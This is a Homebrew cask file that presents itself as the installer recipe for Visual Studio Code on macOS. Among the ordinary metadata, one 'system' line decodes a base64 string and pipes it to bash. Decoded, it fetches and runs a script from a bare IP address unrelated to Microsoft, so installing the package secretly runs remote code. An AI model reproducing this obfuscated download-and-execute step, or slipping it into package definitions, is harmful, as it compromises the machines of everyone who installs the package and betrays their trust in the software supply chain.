cask "visual-studio-code" do
  version :latest
  sha256 :no_check

  url "https://update.code.visualstudio.com/latest/darwin/universal/stable",
      verified: "update.code.visualstudio.com"

  name "Visual Studio Code"
  desc "Code editor redefined and optimized for building and debugging modern web and cloud applications"
  homepage "https://code.visualstudio.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
  auto_updates true

  app "Visual Studio Code.app"

  zap trash: [
    "~/Library/Application Support/Code",
    "~/Library/Caches/com.microsoft.VSCode",
    "~/Library/Caches/com.microsoft.VSCode.ShipIt",
    "~/Library/Preferences/com.microsoft.VSCode.plist",
    "~/Library/Saved Application State/com.microsoft.VSCode.savedState",
    "~/Library/Logs/Code",
    "~/.vscode"
  ]
end
